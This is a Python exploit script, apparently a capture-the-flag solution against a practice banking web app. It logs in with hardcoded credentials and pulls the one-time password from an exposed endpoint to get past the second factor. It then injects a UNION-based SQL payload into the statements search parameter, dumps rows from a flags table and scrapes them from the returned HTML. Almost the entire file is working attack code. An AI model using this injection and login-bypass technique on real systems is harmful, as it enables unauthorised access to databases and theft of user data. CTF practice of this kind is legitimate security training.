#!/usr/bin/env python3
"""
Check which user_id we are logged in as
"""
import urllib.request
import urllib.parse
import http.cookiejar
import json
import re
import sys

if sys.stdout.encoding != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    # Login
    req = urllib.request.Request(f"{url_base}/login")
    opener.open(req, timeout=10)

    login_data = urllib.parse.urlencode({
        'customer_id': 'BS100234',
        'password': 'password123'
    }).encode()
    req = urllib.request.Request(f"{url_base}/login", data=login_data, method='POST')
    opener.open(req, timeout=10)

    req = urllib.request.Request(f"{url_base}/get-login-otp")
    otp = json.loads(opener.open(req, timeout=10).read().decode('utf-8')).get('otp')

    otp_data = urllib.parse.urlencode({'otp': otp}).encode()
    req = urllib.request.Request(f"{url_base}/login", data=otp_data, method='POST')
    opener.open(req, timeout=10)

    # Access statements to seed
    req = urllib.request.Request(f"{url_base}/statements")
    opener.open(req, timeout=10)

    print("[*] Querying user_id from ctf_flags...")

    # Query to get user_id and flag from ctf_flags
    payload = "abc' Union select CAST(user_id AS CHAR), flag, 'C','D','E','F','G' from ctf_flags#"
    encoded = urllib.parse.quote(payload)
    url = f"{url_base}/statements?account_id=1&from_date=&to_date=&q={encoded}"

    req = urllib.request.Request(url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    # Extract all flags
    flags = re.findall(r'BANKSPLOIT\{[A-F0-9]{12}\}', html)
    rows = re.findall(r'<td[^>]*>([^<]+)</td>', html)

    print(f"[+] Found {len(rows)} table cells:")
    for i, row in enumerate(rows):
        print(f"    [{i}]: {row}")

    if flags:
        print(f"\n[+] Flags found: {flags}")

except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()
